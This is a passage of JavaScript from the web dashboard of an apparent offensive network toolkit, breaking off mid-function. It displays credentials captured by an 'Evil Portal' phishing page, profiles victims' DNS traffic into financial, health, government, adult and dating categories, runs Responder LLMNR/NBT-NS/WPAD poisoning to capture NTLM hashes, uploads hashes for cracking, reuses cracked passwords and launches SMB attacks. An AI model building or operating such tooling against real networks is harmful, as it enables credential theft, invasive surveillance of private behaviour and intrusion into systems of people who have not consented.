                            html += '<div style="margin-bottom:15px;padding-bottom:10px;border-bottom:1px solid #333;">' + formatted + '</div>';
                        }
                    });
                    logDiv.innerHTML = html;
                } else {
                    logDiv.innerHTML = '<div style="color:#f00;">Error loading archive</div>';
                }
            } catch (e) {
                console.error('Load archive error:', e);
                logDiv.innerHTML = '<div style="color:#f00;">Error loading archive</div>';
            }
        }
        
        async function deleteSelectedArchive() {
            const select = document.getElementById('archiveSelect');
            const filename = select.value;
            
            // If current session - just clear the display (polling continues for new creds)
            if (!filename) {
                document.getElementById('credentialLog').innerHTML = '<div style="color:#666;">No credentials yet</div>';
                document.getElementById('credentialCount').textContent = '(0)';
                lastCredentialCount = 0;
                return;
            }
            
            // Otherwise delete the selected archive
            if (!confirm('Delete archive: ' + filename + '?')) {
                return;
            }
            
            try {
                const response = await fetch('/api/portal/archives/' + filename, { method: 'DELETE' });
                const data = await response.json();
                
                if (data.success) {
                    loadArchiveList();
                    select.value = '';
                    document.getElementById('credentialLog').innerHTML = '<div style="color:#666;">No credentials yet</div>';
                    document.getElementById('credentialCount').textContent = '(0)';
                } else {
                    alert(data.message || 'Failed to delete');
                }
            } catch (e) {
                console.error('Delete archive error:', e);
                alert('Error deleting archive');
            }
        }
        
        async function updatePortalStatus() {
            try {
                const response = await fetch('/api/portal/status');
                const data = await response.json();
                const badge = document.getElementById('portalStatusBadge');
                if (badge) {
                    if (data.running) {
                        badge.textContent = '‚óè RUNNING';
                        badge.style.background = '#030';
                        badge.style.borderColor = '#060';
                        badge.style.color = '#0f0';
                    } else {
                        badge.textContent = '‚óè STOPPED';
                        badge.style.background = '#300';
                        badge.style.borderColor = '#600';
                        badge.style.color = '#f66';
                    }
                }
            } catch (e) {
                console.error('Portal status error:', e);
            }
        }
        
        // Poll portal status when on page
        setInterval(() => {
            if (document.getElementById('page-evil-portal').classList.contains('active')) {
                updatePortalStatus();
            }
        }, 3000);
        
        let credentialPollInterval = null;
        
        function startCredentialPolling() {
            if (credentialPollInterval) clearInterval(credentialPollInterval);
            credentialPollInterval = setInterval(() => {
                if (document.getElementById('page-evil-portal').classList.contains('active')) {
                    checkForNewCredentials();
                }
            }, 5000);
        }
        
        async function checkForNewCredentials() {
            // Check for new creds and display them when they arrive
            try {
                const response = await fetch('/api/portal/log');
                const data = await response.json();
                const countSpan = document.getElementById('credentialCount');
                const logDiv = document.getElementById('credentialLog');
                
                if (data.log && data.log.trim()) {
                    const credCount = (data.log.match(/=== \d{4}-\d{2}-\d{2}/g) || []).length;
                    
                    // New creds arrived - load and display them
                    if (credCount > lastCredentialCount) {
                        // Flash notification
                        logDiv.style.boxShadow = '0 0 20px #0f0';
                        setTimeout(() => { logDiv.style.boxShadow = 'none'; }, 2000);
                        
                        // Update count
                        countSpan.textContent = '(' + credCount + ')';
                        lastCredentialCount = credCount;
                        
                        // Load creds into display (newest at top)
                        const blocks = data.log.trim().split(/(?=\n=== \d{4}-)/);
                        blocks.reverse();
                        
                        let html = '';
                        blocks.forEach(block => {
                            if (block.trim()) {
                                const formatted = block.replace(/(=== \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} ===)/g, 
                                    '<span style="color:#ff0;font-weight:bold;">$1</span>');
                                html += '<div style="margin-bottom:15px;padding-bottom:10px;border-bottom:1px solid #333;">' + formatted + '</div>';
                            }
                        });
                        logDiv.innerHTML = html;
                    }
                }
            } catch (e) {
                console.error('Check credentials error:', e);
            }
        }
        
        function stopCredentialPolling() {
            if (credentialPollInterval) {
                clearInterval(credentialPollInterval);
                credentialPollInterval = null;
            }
        }
        
        // ============== MITM FUNCTIONS ==============
        
        let mitmPolling = null;
        
        async function refreshMitm() {
            try {
                const response = await fetch('/api/mitm/dns');
                const data = await response.json();
                
                if (data.success) {
                    // Update services grid
                    const servicesGrid = document.getElementById('servicesGrid');
                    const services = data.services || {};
                    const serviceKeys = Object.keys(services);
                    
                    document.getElementById('serviceCount').textContent = `(${serviceKeys.length} services)`;
                    document.getElementById('activityCount').textContent = `(${data.filtered_count || 0} activities)`;
                    document.getElementById('mitmRawCount').textContent = data.raw_count || 0;
                    
                    if (serviceKeys.length === 0) {
                        servicesGrid.innerHTML = '<div style="color: #666; font-size: 12px;">Waiting for victim activity...</div>';
                    } else {
                        let servicesHtml = '';
                        serviceKeys.forEach(key => {
                            const svc = services[key];
                            const bgColor = getBgColorForService(key);
                            servicesHtml += `<div style="background: ${bgColor}; padding: 6px 12px; border-radius: 4px; font-size: 13px;" title="${svc.name}: ${svc.count} requests">
                                ${svc.icon} ${svc.name} <span style="color: #888;">(${svc.count})</span>
                            </div>`;
                        });
                        servicesGrid.innerHTML = servicesHtml;
                    }
                    
                    // Update activity feed
                    const activityFeed = document.getElementById('activityFeed');
                    const activity = data.activity || [];
                    
                    if (activity.length === 0) {
                        activityFeed.innerHTML = '<div style="color: #666; font-size: 13px;">Start Evil Portal with Passthrough mode to monitor victim activity...</div>';
                    } else {
                        let activityHtml = '';
                        activity.forEach(a => {
                            const typeColor = a.type === 'known' ? '#0f0' : '#888';
                            activityHtml += `<div style="padding: 8px; margin-bottom: 6px; background: #111; border-radius: 4px; border-left: 3px solid ${typeColor};">
                                <div style="display: flex; justify-content: space-between; align-items: center;">
                                    <span style="font-size: 14px;">${a.icon} <strong>${a.service}</strong></span>
                                    <span style="color: #666; font-size: 11px;">${a.timestamp}</span>
                                </div>
                                <div style="color: #666; font-size: 11px; margin-top: 4px;">${a.domain}</div>
                            </div>`;
                        });
                        activityFeed.innerHTML = activityHtml;
                    }
                    
                    // Update intelligence summary
                    updateIntelligence(services, activity);
                }
            } catch (err) {
                console.error('Error fetching MITM data:', err);
            }
        }
        
        function getBgColorForService(key) {
            const colors = {
                // High-value (orange/red tones)
                'banking': '#331100',
                'paypal': '#331100',
                'venmo': '#331100',
                'cashapp': '#331100',
                'zelle': '#331100',
                'crypto': '#333300',
                'health': '#330011',
                'government': '#112233',
                
                // Sensitive (red/pink)
                'adult': '#330000',
                'dating': '#330022',
                
                // Security indicator (purple)
                'vpn': '#220033',
                
                // Email (teal)
                'gmail': '#003333',
                'outlook': '#003333',
                'yahoo': '#003333',
                
                // Social (blue tones)
                'facebook': '#001133',
                'instagram': '#110033',
                'twitter': '#001133',
                'tiktok': '#110022',
                'snapchat': '#333300',
                'linkedin': '#001133',
                
                // Work apps (blue-gray)
                'slack': '#112222',
                'zoom': '#002233',
                'teams': '#112233',
                
                // Shopping (green)
                'amazon': '#113311',
                'ebay': '#113311',
                'walmart': '#113311',
                'target': '#113311',
                
                // Food (orange)
                'doordash': '#221100',
                'ubereats': '#221100',
                'grubhub': '#221100',
                
                // Travel (cyan)
                'airbnb': '#003333',
                'uber': '#002222',
                'lyft': '#220022',
                
                'default': '#1a1a1a'
            };
            return colors[key] || colors['default'];
        }
        
        function updateIntelligence(services, activity) {
            const intel = document.getElementById('intelligenceSummary');
            let html = '';
            
            // High-value targets (financial)
            const highValue = ['banking', 'paypal', 'venmo', 'cashapp', 'zelle', 'crypto', 'gmail', 'outlook', 'yahoo'];
            const foundHighValue = Object.keys(services).filter(k => highValue.includes(k));
            
            if (foundHighValue.length > 0) {
                html += '<div style="color: #ff9900; margin-bottom: 8px;">‚ö†Ô∏è <strong>High-Value:</strong></div>';
                foundHighValue.forEach(k => {
                    html += `<div style="color: #ff9900; margin-left: 10px; margin-bottom: 3px; font-size: 11px;">‚Ä¢ ${services[k].icon} ${services[k].name}</div>`;
                });
            }
            
            // Health & Government (very sensitive)
            const sensitive_govt = ['health', 'government'];
            const foundGovt = Object.keys(services).filter(k => sensitive_govt.includes(k));
            
            if (foundGovt.length > 0) {
                html += '<div style="color: #ff6600; margin-top: 8px; margin-bottom: 8px;">üèõÔ∏è <strong>Sensitive:</strong></div>';
                foundGovt.forEach(k => {
                    html += `<div style="color: #ff6600; margin-left: 10px; margin-bottom: 3px; font-size: 11px;">‚Ä¢ ${services[k].icon} ${services[k].name}</div>`;
                });
            }
            
            // Adult/Dating
            const sensitive = ['adult', 'dating'];
            const foundSensitive = Object.keys(services).filter(k => sensitive.includes(k));
            
            if (foundSensitive.length > 0) {
                html += '<div style="color: #ff4444; margin-top: 8px; margin-bottom: 8px;">üîû <strong>Private:</strong></div>';
                foundSensitive.forEach(k => {
                    html += `<div style="color: #ff4444; margin-left: 10px; margin-bottom: 3px; font-size: 11px;">‚Ä¢ ${services[k].icon} ${services[k].name}</div>`;
                });
            }
            
            // VPN detected (security-aware user)
            if (services['vpn']) {
                html += '<div style="color: #aa44ff; margin-top: 8px; margin-bottom: 8px;">üîê <strong>Security Alert:</strong></div>';
                html += '<div style="color: #aa44ff; margin-left: 10px; margin-bottom: 3px; font-size: 11px;">‚Ä¢ VPN user detected - may be security-aware</div>';
            }
            
            // Work apps
            const work = ['slack', 'zoom', 'teams', 'webex', 'asana', 'trello', 'notion'];
            const foundWork = Object.keys(services).filter(k => work.includes(k));
            
            if (foundWork.length > 0) {
                html += '<div style="color: #44aaff; margin-top: 8px; margin-bottom: 8px;">üíº <strong>Work Apps:</strong></div>';
                foundWork.forEach(k => {
                    html += `<div style="color: #888; margin-left: 10px; margin-bottom: 3px; font-size: 11px;">‚Ä¢ ${services[k].icon} ${services[k].name}</div>`;
                });
            }
            
            // Social
            const social = ['facebook', 'instagram', 'twitter', 'tiktok', 'snapchat', 'reddit', 'linkedin'];
            const foundSocial = Object.keys(services).filter(k => social.includes(k));
            
            if (foundSocial.length > 0) {
                html += '<div style="color: #0f0; margin-top: 8px; margin-bottom: 8px;">üì± <strong>Social:</strong></div>';
                foundSocial.forEach(k => {
                    html += `<div style="color: #888; margin-left: 10px; margin-bottom: 3px; font-size: 11px;">‚Ä¢ ${services[k].icon} ${services[k].name}</div>`;
                });
            }
            
            if (!html) {
                html = '<div style="color: #666;">Waiting for activity to analyze...</div>';
            }
            
            intel.innerHTML = html;
        }
        
        async function clearDnsLog() {
            if (!confirm('Clear all captured activity?')) return;
            try {
                const response = await fetch('/api/mitm/dns/clear', { method: 'POST' });
                const data = await response.json();
                if (data.success) {
                    refreshMitm();
                }
            } catch (err) {
                console.error('Error clearing DNS log:', err);
            }
        }
        
        async function newMitmSession() {
            if (!confirm('Start new session? This will clear all captured data but keep the portal running.')) return;
            try {
                // Clear DNS log
                await fetch('/api/mitm/dns/clear', { method: 'POST' });
                
                // Archive and clear portal credentials
                await fetch('/api/portal/archive', { method: 'POST' });
                
                // Refresh displays
                refreshMitm();
                updateMitmStatus();
                
                // Clear the UI displays
                document.getElementById('servicesGrid').innerHTML = '<div style="color: #666; padding: 20px; text-align: center;">No services detected yet</div>';
                document.getElementById('activityFeed').innerHTML = '<div style="color: #666;">Waiting for activity...</div>';
                document.getElementById('intelligenceSummary').innerHTML = '<div style="color: #666;">Connect a device to start profiling...</div>';
                document.getElementById('serviceCount').textContent = '(0 services)';
                document.getElementById('activityCount').textContent = '(0 activities)';
                
                alert('‚úÖ New session started. Previous credentials archived.');
            } catch (err) {
                console.error('Error starting new session:', err);
                alert('Error: ' + err.message);
            }
        }
        
        async function exportMitm() {
            try {
                const response = await fetch('/api/mitm/dns');
                const data = await response.json();
                
                let report = '‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n';
                report += '                    MITM INTELLIGENCE REPORT\n';
                report += '‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n';
                report += 'Generated: ' + new Date().toLocaleString() + '\n';
                report += '\n';
                
                // Services detected
                report += '‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n';
                report += '                      SERVICES DETECTED\n';
                report += '‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n';
                if (data.services && Object.keys(data.services).length > 0) {
                    for (const [category, services] of Object.entries(data.services)) {
                        report += '\n[' + category.toUpperCase() + ']\n';
                        services.forEach(s => {
                            report += '  ‚Ä¢ ' + s.name + ' (' + s.domain + ')\n';
                        });
                    }
                } else {
                    report += '  No services detected\n';
                }
                
                // Intelligence summary
                report += '\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n';
                report += '                      INTELLIGENCE SUMMARY\n';
                report += '‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n';
                if (data.intelligence) {
                    if (data.intelligence.high_value && data.intelligence.high_value.length > 0) {
                        report += '\n‚ö†Ô∏è  HIGH VALUE TARGETS:\n';
                        data.intelligence.high_value.forEach(s => report += '    ‚Ä¢ ' + s + '\n');
                    }
                    if (data.intelligence.sensitive && data.intelligence.sensitive.length > 0) {
                        report += '\nüîí SENSITIVE:\n';
                        data.intelligence.sensitive.forEach(s => report += '    ‚Ä¢ ' + s + '\n');
                    }
                    if (data.intelligence.private && data.intelligence.private.length > 0) {
                        report += '\nüëÅÔ∏è  PRIVATE:\n';
                        data.intelligence.private.forEach(s => report += '    ‚Ä¢ ' + s + '\n');
                    }
                    if (data.intelligence.security_concern && data.intelligence.security_concern.length > 0) {
                        report += '\nüõ°Ô∏è  SECURITY AWARE:\n';
                        data.intelligence.security_concern.forEach(s => report += '    ‚Ä¢ ' + s + '\n');
                    }
                }
                
                // Activity feed
                report += '\n‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n';
                report += '                        ACTIVITY LOG\n';
                report += '‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\n';
                if (data.activity && data.activity.length > 0) {
                    data.activity.forEach(a => {
                        report += a.time + ' - ' + a.name + ' (' + a.domain + ')\n';
                    });
                } else {
                    report += '  No activity recorded\n';
                }
                
                report += '\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n';
                report += '                      END OF REPORT\n';
                report += '‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n';
                
                // Download
                const blob = new Blob([report], {type: 'text/plain'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'mitm_report_' + new Date().toISOString().slice(0,19).replace(/:/g, '-') + '.txt';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            } catch (err) {
                console.error('Error exporting MITM:', err);
                alert('Error exporting report');
            }
        }
        
        async function updateMitmStatus() {
            try {
                const portalRes = await fetch('/api/portal/status');
                const portalData = await portalRes.json();
                
                const portalStatus = document.getElementById('mitmPortalStatus');
                if (portalData.running) {
                    portalStatus.textContent = 'Active';
                    portalStatus.style.color = '#00ff00';
                } else {
                    portalStatus.textContent = 'Not Running';
                    portalStatus.style.color = '#ff4444';
                }
                
                document.getElementById('mitmClientCount').textContent = portalData.client_count || 0;
                
                const credRes = await fetch('/api/portal/log');
                const credData = await credRes.json();
                const credMatches = (credData.log || '').match(/===/g);
                document.getElementById('mitmCredCount').textContent = credMatches ? credMatches.length : 0;
                
            } catch (err) {
                console.error('Error updating MITM status:', err);
            }
        }
        
        function startMitmPolling() {
            if (mitmPolling) return;
            refreshMitm();
            updateMitmStatus();
            mitmPolling = setInterval(() => {
                refreshMitm();
                updateMitmStatus();
            }, 3000);
        }
        
        function stopMitmPolling() {
            if (mitmPolling) {
                clearInterval(mitmPolling);
                mitmPolling = null;
            }
        }
        
        // ============== INTERNAL ATTACK FUNCTIONS ==============

        function esc(str) {
            if (!str) return '';
            return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
        }

        let discoveryInterval = null;
        let responderInterval = null;
        
        async function startDiscovery() {
            const iface = document.getElementById('discoverInterface').value;
            appendInternalOutput('[*] Starting passive discovery on ' + iface + '...');
            
            try {
                const response = await fetch('/api/internal/discover/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ interface: iface })
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('discoverStatus').textContent = 'Running';
                    document.getElementById('discoverStatus').style.color = '#0f0';
                    appendInternalOutput('[+] Discovery started');
                    
                    // Start polling for results
                    if (discoveryInterval) clearInterval(discoveryInterval);
                    discoveryInterval = setInterval(refreshDiscoveryResults, 3000);
                } else {
                    appendInternalOutput('[-] Failed: ' + (data.output || data.error));
                }
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function stopDiscovery() {
            try {
                const response = await fetch('/api/internal/discover/stop', { method: 'POST' });
                const data = await response.json();
                
                document.getElementById('discoverStatus').textContent = 'Stopped';
                document.getElementById('discoverStatus').style.color = '#666';
                
                if (discoveryInterval) {
                    clearInterval(discoveryInterval);
                    discoveryInterval = null;
                }
                
                appendInternalOutput('[*] Discovery stopped');
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function clearDiscovery() {
            try {
                await fetch('/api/internal/discover/clear', { method: 'POST' });
                document.getElementById('discoveryResults').innerHTML = '<div style="color: #666;">Results cleared...</div>';
                appendInternalOutput('[*] Discovery results cleared');
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function refreshDiscoveryResults() {
            try {
                const response = await fetch('/api/internal/discover/results');
                const data = await response.json();
                
                if (data.success && data.results) {
                    const results = data.results;
                    let html = '';
                    
                    // Vulnerabilities
                    if (results.vulnerabilities && results.vulnerabilities.length > 0) {
                        html += '<div style="color: #f00; margin-bottom: 10px; font-weight: bold;">‚ö†Ô∏è VULNERABILITIES</div>';
                        results.vulnerabilities.forEach(v => {
                            const color = v.severity === 'critical' ? '#f00' : v.severity === 'high' ? '#ff0' : '#888';
                            html += '<div style="padding: 5px; margin-bottom: 5px; border-left: 3px solid ' + color + '; background: #111;">';
                            html += '<span style="color: ' + color + ';">[' + esc(v.type) + ']</span> ';
                            html += '<span style="color: #0f0;">' + esc(v.target) + '</span><br>';
                            html += '<span style="color: #888; font-size: 10px;">' + esc(v.details) + '</span>';
                            if (v.attack && v.attack !== 'info' && v.attack !== 'captured' && /^[a-z]+$/.test(v.attack) && /^[0-9a-fA-F.:]+$/.test(v.target)) {
                                html += ' <button onclick="autoAttack(\'' + v.attack + '\', \'' + v.target + '\')" style="padding: 2px 6px; font-size: 9px; background: #440000; border: 1px solid #660000; color: #f00; cursor: pointer;">Attack</button>';
                            }
                            html += '</div>';
                        });
                    }
                    
                    // Hosts
                    const hostCount = Object.keys(results.hosts || {}).length;
                    if (hostCount > 0) {
                        html += '<div style="color: #0f0; margin: 10px 0 5px 0;">üì° Hosts Discovered: ' + hostCount + '</div>';
                    }
                    
                    // Cleartext creds
                    if (results.cleartext && results.cleartext.length > 0) {
                        html += '<div style="color: #ff0; margin: 10px 0 5px 0;">üîë CLEARTEXT CREDENTIALS</div>';
                        results.cleartext.forEach(c => {
                            html += '<div style="padding: 3px; color: #ff0; font-family: monospace;">';
                            html += esc(c.type) + ': ' + esc(c.credentials || c.data);
                            html += '</div>';
                        });
                    }
                    
                    if (html === '') {
                        html = '<div style="color: #666;">Listening for traffic...</div>';
                    }
                    
                    document.getElementById('discoveryResults').innerHTML = html;
                }
            } catch (err) {
                console.error('Discovery refresh error:', err);
            }
        }
        
        async function startResponder() {
            const iface = document.getElementById('discoverInterface').value;
            appendInternalOutput('[*] Starting Responder on ' + iface + '...');
            
            try {
                const response = await fetch('/api/internal/responder/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ interface: iface })
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('responderStatus').textContent = 'Running';
                    document.getElementById('responderStatus').style.color = '#f00';
                    appendInternalOutput('[+] Responder started - poisoning LLMNR/NBT-NS/WPAD');
                    
                    // Start polling for hashes
                    if (responderInterval) clearInterval(responderInterval);
                    responderInterval = setInterval(refreshHashes, 5000);
                } else {
                    appendInternalOutput('[-] Failed: ' + (data.output || data.error));
                }
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function stopResponder() {
            try {
                await fetch('/api/internal/responder/stop', { method: 'POST' });
                
                document.getElementById('responderStatus').textContent = 'Stopped';
                document.getElementById('responderStatus').style.color = '#666';
                
                if (responderInterval) {
                    clearInterval(responderInterval);
                    responderInterval = null;
                }
                
                appendInternalOutput('[*] Responder stopped');
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function refreshHashes() {
            try {
                const response = await fetch('/api/internal/hashes');
                const data = await response.json();
                
                if (data.success) {
                    const hashes = data.hashes || [];
                    document.getElementById('hashCount').textContent = hashes.length;
                    
                    if (hashes.length > 0) {
                        let html = '';
                        hashes.forEach((h, i) => {
                            const status = h.cracked_password ? '‚úÖ CRACKED' : '‚è≥ Captured';
                            const statusColor = h.cracked_password ? '#0f0' : '#ff0';
                            html += '<div style="padding: 5px; margin-bottom: 5px; border: 1px solid #333; background: #111;">';
                            html += '<div style="display: flex; justify-content: space-between;">';
                            html += '<span style="color: #0f0;">' + esc(h.domain || '') + '\\' + esc(h.user) + '</span>';
                            html += '<span style="color: ' + statusColor + '; font-size: 10px;">' + status + '</span>';
                            html += '</div>';
                            if (h.cracked_password) {
                                html += '<div style="color: #ff0; font-family: monospace; font-size: 11px; margin-top: 3px;">Password: ' + esc(h.cracked_password) + '</div>';
                                html += '<button data-user="' + esc(h.user) + '" data-pass="' + esc(h.cracked_password) + '" data-domain="' + esc(h.domain || 'WORKGROUP') + '" onclick="useCredentials(this.dataset.user, this.dataset.pass, this.dataset.domain)" style="padding: 3px 8px; font-size: 9px; margin-top: 3px; background: #003300; border: 1px solid #006600; color: #0f0; cursor: pointer;">Use These</button>';
                            } else {
                                html += '<button onclick="sendHashToGlass(' + i + ')" style="padding: 3px 8px; font-size: 9px; margin-top: 3px; background: #330033; border: 1px solid #660066; color: #f0f; cursor: pointer;">Send to Glass</button>';
                            }
                            html += '</div>';
                        });
                        document.getElementById('credentialsList').innerHTML = html;
                    }
                }
                
                // Also update responder status
                const statusRes = await fetch('/api/internal/responder/status');
                const statusData = await statusRes.json();
                if (statusData.running) {
                    document.getElementById('responderStatus').textContent = 'Running';
                    document.getElementById('responderStatus').style.color = '#f00';
                }
            } catch (err) {
                console.error('Hash refresh error:', err);
            }
        }
        
        function useCredentials(user, pass, domain) {
            document.getElementById('attackUser').value = user;
            document.getElementById('attackPass').value = pass;
            document.getElementById('attackDomain').value = domain;
            appendInternalOutput('[+] Credentials loaded: ' + domain + '\\' + user);
        }
        
        async function sendHashToGlass(index) {
            try {
                const response = await fetch('/api/internal/hashes');
                const data = await response.json();
                
                if (data.success && data.hashes && data.hashes[index]) {
                    const hash = data.hashes[index].hash;
                    
                    const sendRes = await fetch('/api/internal/hashes/send-to-glass', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ hash: hash })
                    });
                    const sendData = await sendRes.json();
                    
                    if (sendData.success) {
                        if (sendData.glass_uploaded) {
                            appendInternalOutput('[+] Hash uploaded to Glass for cracking');
                        } else {
                            appendInternalOutput('[!] ' + sendData.message);
                        }
                    } else {
                        appendInternalOutput('[-] Failed to send hash: ' + sendData.error);
                    }
                }
            } catch (err) {
                appendInternalOutput('[-] Error: ' + err.message);
            }
        }
        
        async function smbListShares() {
            const target = document.getElementById('attackTarget').value;
            const user = document.getElementById('attackUser').value;
            const pass = document.getElementById('attackPass').value;
            const domain = document.getElementById('attackDomain').value;
            
            if (!target) {
                appendInternalOutput('[-] No target specified');
                return;
            }
            
            appendInternalOutput('[*] Listing SMB shares on ' + target + '...');
            
